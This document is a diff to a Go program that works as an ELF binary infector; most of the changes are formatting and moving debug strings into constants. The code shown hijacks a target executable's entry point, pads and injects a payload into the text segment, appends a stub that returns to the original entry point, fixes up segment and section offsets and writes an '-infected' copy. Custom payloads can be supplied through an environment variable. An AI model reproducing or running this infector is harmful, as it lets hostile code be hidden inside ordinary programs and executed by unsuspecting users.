@@ -16,7 +16,19 @@ import (
 )
 
 const (
-	PAGE_SIZE int = 4096
+	PAGE_SIZE                       int    = 4096
+	MOD_ENTRY_POINT                 string = "[+] Modified entry point from 0x%x -> 0x%x\n"
+	TEXT_SEG_START                  string = "[+] Text segment starts @ 0x%x\n"
+	TEXT_SEG_END                    string = "[+] Text segment ends @ 0x%x\n"
+	PAYLOAD_LEN_PRE_EPILOGUE        string = "[+] Payload size pre-epilogue 0x%x\n"
+	PAYLOAD_LEN_POST_EPILOGUE       string = "[+] Payload size post-epilogue 0x%x\n"
+	GENERATE_AND_APPEND_PIC_STUB    string = "[+] Generated and appended position independent return 2 OEP stub to payload"
+	INCREASED_TEXT_SEG_P_FILESZ     string = "[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n"
+	ADJUST_SEGMENTS_AFTER_TEXT      string = "[+] Adjusting segments after text segment file offsets by 0x%x"
+	INCREASE_PHEADER_AT_INDEX_BY    string = "Inceasing pHeader @ index %d by 0x%x\n"
+	INCREASE_SECTION_HEADER_ADDRESS string = "[+] Increasing section header addresses if they come after text segment"
+	UPDATE_SECTIONS_PAST_TEXT_SEG   string = "[+] (%d) Updating sections past text segment @ addr 0x%x\n"
+	EXTEND_SECTION_HEADER_ENTRY     string = "[+] Extending section header entry for text section by payload len."
 )
 
 type enumIdent struct {
@@ -25,7 +37,7 @@ type enumIdent struct {
 }
 
 type targetBin struct {
-	Filesz int64
+	Filesz   int64
 	Contents []byte
 	//tName string
 	Ident   []byte
@@ -37,40 +49,40 @@ type targetBin struct {
 	Payload bytes.Buffer
 }
 
-var preserve64 = []byte {
-	0x50,              //push   %rax
-	0x53,              //push   %rbx
-	0x52,              //push   %rdx
-	0x56,              //push   %rsi
-	0x57,              //push   %rdi
-	0x55,              //push   %rbp
-	0x54,              //push   %rsp
-	0x41, 0x50,        //push   %r8
-	0x41, 0x51,        //push   %r9
-	0x41, 0x52,        //push   %r10
-	0x41, 0x53,        //push   %r11
-	0x41, 0x54,        //push   %r12
-	0x41, 0x55,        //push   %r13
-	0x41, 0x56,        //push   %r14
-	0x41, 0x57,        //push   %r15
+var preserve64 = []byte{
+	0x50,       //push   %rax
+	0x53,       //push   %rbx
+	0x52,       //push   %rdx
+	0x56,       //push   %rsi
+	0x57,       //push   %rdi
+	0x55,       //push   %rbp
+	0x54,       //push   %rsp
+	0x41, 0x50, //push   %r8
+	0x41, 0x51, //push   %r9
+	0x41, 0x52, //push   %r10
+	0x41, 0x53, //push   %r11
+	0x41, 0x54, //push   %r12
+	0x41, 0x55, //push   %r13
+	0x41, 0x56, //push   %r14
+	0x41, 0x57, //push   %r15
 }
 
-var restoration64 = []byte {
-	0x41, 0x5f,        //pop    %r15
-	0x41, 0x5e,        //pop    %r14
-	0x41, 0x5d,        //pop    %r13
-	0x41, 0x5c,        //pop    %r12
-	0x41, 0x5b,        //pop    %r11
-	0x41, 0x5a,        //pop    %r10
-	0x41, 0x59,        //pop    %r9
-	0x41, 0x58,        //pop    %r8
-	0x5c, 	           //pop    %rsp
-	0x5d, 	           //pop    %rbp
-	0x5f,              //pop    %rdi
-	0x5e,              //pop    %rsi
-	0x5a,              //pop    %rdx
-	0x5b,              //pop    %rbx
-	0x58,              //pop    %rax
+var restoration64 = []byte{
+	0x41, 0x5f, //pop    %r15
+	0x41, 0x5e, //pop    %r14
+	0x41, 0x5d, //pop    %r13
+	0x41, 0x5c, //pop    %r12
+	0x41, 0x5b, //pop    %r11
+	0x41, 0x5a, //pop    %r10
+	0x41, 0x59, //pop    %r9
+	0x41, 0x58, //pop    %r8
+	0x5c, //pop    %rsp
+	0x5d, //pop    %rbp
+	0x5f, //pop    %rdi
+	0x5e, //pop    %rsi
+	0x5a, //pop    %rdx
+	0x5b, //pop    %rbx
+	0x58, //pop    %rax
 }
 
 var defaultPayload64 = []byte{
@@ -102,29 +114,35 @@ var defaultPayload64 = []byte{
 }
 
 var defaultPayload32 = []byte{
-	0xeb, 0x00,	                				//jmp    8049002 <message>
+	0xeb, 0x00, //jmp    8049002 <message>
 	//08049002 <message>:
-	0xe8, 0x2b, 0x00, 0x00, 0x00,       		//call   8049032 <shellcode>
-	0x68, 0x65, 0x6c, 0x6c, 0x6f,       		//push   $0x6f6c6c65
-	0x20, 0x2d, 0x2d, 0x20, 0x74, 68,    		//and    %ch,0x6874202d
-	0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 	//imul   $0x61207369,0x20(%ebx),%esi
-	0x20, 0x6e, 0x6f,             				//and    %ch,0x6f(%esi)
-	0x6e,                   					//outsb  %ds:(%esi),(%dx)
-	0x2d, 0x64, 0x65, 0x73, 0x74,       		//sub    $0x74736564,%eax
-	0x72, 0x75,                					//jb     8049099 <shellcode+0x67>
-	0x63, 0x74, 0x69, 0x76,          			//arpl   %si,0x76(%ecx,%ebp,2)
-	0x65, 0x20, 0x70, 0x61,          			//and    %dh,%gs:0x61(%eax)
-	0x79, 0x6c,                					//jns    804909a <shellcode+0x68>
-	0x6f,                   					//outsl  %ds:(%esi),(%dx)
-	0x61,                   					//popa   
-	0x64,                   					//fs
-	0x0a,                   					//.byte 0xa
-	//08049032 <shellcode>:								
- 	0x59,                   					//pop    %ecx
- 	0xbb, 0x01, 0x00, 0x00, 0x00,       		//mov    $0x1,%ebx
- 	0xba, 0x2a, 0x00, 0x00, 0x00,       		//mov    $0x2a,%edx
- 	0xb8, 0x04, 0x00, 0x00, 0x00,       		//mov    $0x4,%eax
- 	0xcd, 0x80,                					//int    $0x80
+	0xe8, 0x2b, 0x00, 0x00, 0x00, //call   8049032 <shellcode>
+	0x68, 0x65, 0x6c, 0x6c, 0x6f, //push   $0x6f6c6c65
+	0x20, 0x2d, 0x2d, 0x20, 0x74, 68, //and    %ch,0x6874202d
+	0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, //imul   $0x61207369,0x20(%ebx),%esi
+	0x20, 0x6e, 0x6f, //and    %ch,0x6f(%esi)
+	0x6e,                         //outsb  %ds:(%esi),(%dx)
+	0x2d, 0x64, 0x65, 0x73, 0x74, //sub    $0x74736564,%eax
+	0x72, 0x75, //jb     8049099 <shellcode+0x67>
+	0x63, 0x74, 0x69, 0x76, //arpl   %si,0x76(%ecx,%ebp,2)
+	0x65, 0x20, 0x70, 0x61, //and    %dh,%gs:0x61(%eax)
+	0x79, 0x6c, //jns    804909a <shellcode+0x68>
+	0x6f, //outsl  %ds:(%esi),(%dx)
+	0x61, //popa
+	0x64, //fs
+	0x0a, //.byte 0xa
+	//08049032 <shellcode>:
+	0x59,                         //pop    %ecx
+	0xbb, 0x01, 0x00, 0x00, 0x00, //mov    $0x1,%ebx
+	0xba, 0x2a, 0x00, 0x00, 0x00, //mov    $0x2a,%edx
+	0xb8, 0x04, 0x00, 0x00, 0x00, //mov    $0x4,%eax
+	0xcd, 0x80, //int    $0x80
+}
+
+func printPayload(p []byte) {
+	fmt.Println("------------------PAYLOAD----------------------------")
+	fmt.Printf("%s", hex.Dump(p))
+	fmt.Println("--------------------END------------------------------")
 }
 
 func getPayloadFromEnv(p io.Writer, key string) (int, error) {
@@ -182,53 +200,50 @@ func (t *targetBin) infectBinary(debug bool) error {
 				t.Hdr.(*elf.Header64).Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
 				textSegStart64 = pHeaders[i].Off
 				if debug {
-					fmt.Printf("[+] Modified entry point from 0x%x -> 0x%x\n", oEntry64, t.Hdr.(*elf.Header64).Entry)
+					fmt.Printf(MOD_ENTRY_POINT, oEntry64, t.Hdr.(*elf.Header64).Entry)
 				}
 
 				textSegEnd64 = pHeaders[i].Off + pHeaders[i].Filesz
 				if debug {
-					fmt.Printf("[+] Text segment starts @ 0x%x\n", textSegStart64)
-					fmt.Printf("[+] Text segment ends @ 0x%x\n", textSegEnd64)
-					fmt.Printf("[+] Payload size pre-epilogue 0x%x\n", t.Payload.Len())
+					fmt.Printf(TEXT_SEG_START, textSegStart64)
+					fmt.Printf(TEXT_SEG_END, textSegEnd64)
+					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
 				}
 
 				t.Payload.Write(restoration64)
-				retStub = modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry64)
+				retStub = modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry64)
 				t.Payload.Write(retStub)
-				
-				if debug {
-					fmt.Printf("[+] Payload size post-epilogue 0x%x\n", t.Payload.Len())
 
-					fmt.Println("------------------PAYLOAD----------------------------")
-					fmt.Printf("%s", hex.Dump(t.Payload.Bytes()))
-					fmt.Println("--------------------END------------------------------")
+				if debug {
+					fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
+					printPayload(t.Payload.Bytes())
 				}
 
 				t.Phdrs.([]elf.Prog64)[i].Memsz += uint64(t.Payload.Len())
 				t.Phdrs.([]elf.Prog64)[i].Filesz += uint64(t.Payload.Len())
 
 				if debug {
-					fmt.Println("[+] Generated and appended position independent return 2 OEP stub to payload")
-					fmt.Printf("[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n", t.Payload.Len())
+					fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
+					fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
 				}
 			}
 		}
 
 		if debug {
-			fmt.Println("[+] Adjusting segments after text segment file offsets by ", PAGE_SIZE)
+			fmt.Println(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
 		}
 
 		for j := textNdx; j < pNum; j++ {
 			if pHeaders[textNdx].Off < pHeaders[j].Off {
 				if debug {
-					fmt.Println("Inceasing pHeader @ index ", j, PAGE_SIZE)
+					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
 				}
 				t.Phdrs.([]elf.Prog64)[j].Off += uint64(PAGE_SIZE)
 			}
 		}
 
 		if debug {
-			fmt.Println("[+] Increasing section header addresses if they come after text segment")
+			fmt.Println(INCREASE_SECTION_HEADER_ADDRESS)
 		}
 		sectionHdrTable := t.Shdrs.([]elf.Section64)
 		sNum := int(t.Hdr.(*elf.Header64).Shnum)
@@ -236,12 +251,12 @@ func (t *targetBin) infectBinary(debug bool) error {
 		for k := 0; k < sNum; k++ {
 			if sectionHdrTable[k].Off >= textSegEnd64 {
 				if debug {
-					fmt.Printf("[+] (%d) Updating sections past text segment @ addr 0x%x\n", k, sectionHdrTable[k].Addr)
+					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
 				}
 				t.Shdrs.([]elf.Section64)[k].Off += uint64(PAGE_SIZE)
 			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header64).Entry {
 				if debug {
-					fmt.Println("[+] Extending section header entry for text section by payload len.")
+					fmt.Println(EXTEND_SECTION_HEADER_ENTRY)
 				}
 				t.Shdrs.([]elf.Section64)[k].Size += uint64(t.Payload.Len())
 			}
@@ -280,23 +295,22 @@ func (t *targetBin) infectBinary(debug bool) error {
 	var ephdrsz int
 	switch t.EIdent.Arch {
 	case elf.ELFCLASS64:
-		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize * t.Hdr.(*elf.Header64).Phnum)
+		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize*t.Hdr.(*elf.Header64).Phnum)
 	case elf.ELFCLASS32:
-		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize * t.Hdr.(*elf.Header32).Phnum)
+		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize*t.Hdr.(*elf.Header32).Phnum)
 	}
 
 	infected.Write(t.Contents[ephdrsz:])
 
 	infectedShdrTable := new(bytes.Buffer)
 	switch t.EIdent.Arch {
-	case elf.ELFCLASS64:	
+	case elf.ELFCLASS64:
 		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section64))
 	case elf.ELFCLASS32:
 		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section32))
 	}
 
-
-	finalInfectionTwo := make([]byte, infected.Len() + int(PAGE_SIZE))
+	finalInfectionTwo := make([]byte, infected.Len()+int(PAGE_SIZE))
 	finalInfection := infected.Bytes()
 
 	copy(finalInfection[int(oShoff64):], infectedShdrTable.Bytes())
@@ -308,12 +322,12 @@ func (t *targetBin) infectBinary(debug bool) error {
 	if debug {
 		fmt.Println("[+] writing payload into the binary")
 	}
-	
+
 	copy(finalInfectionTwo[endOfInfection:], t.Payload.Bytes())
-	copy(finalInfectionTwo[endOfInfection + PAGE_SIZE:], finalInfection[endOfInfection:])
+	copy(finalInfectionTwo[endOfInfection+PAGE_SIZE:], finalInfection[endOfInfection:])
 	infectedFileName := fmt.Sprintf("%s-infected", t.Fh.Name())
 
-	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err !=nil {
+	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err != nil {
 		return err
 	}
 	return nil
@@ -465,7 +479,6 @@ func main() {
 		fmt.Println(err)
 		return
 	}
-	
 
 	switch t.EIdent.Arch {
 	case elf.ELFCLASS64:
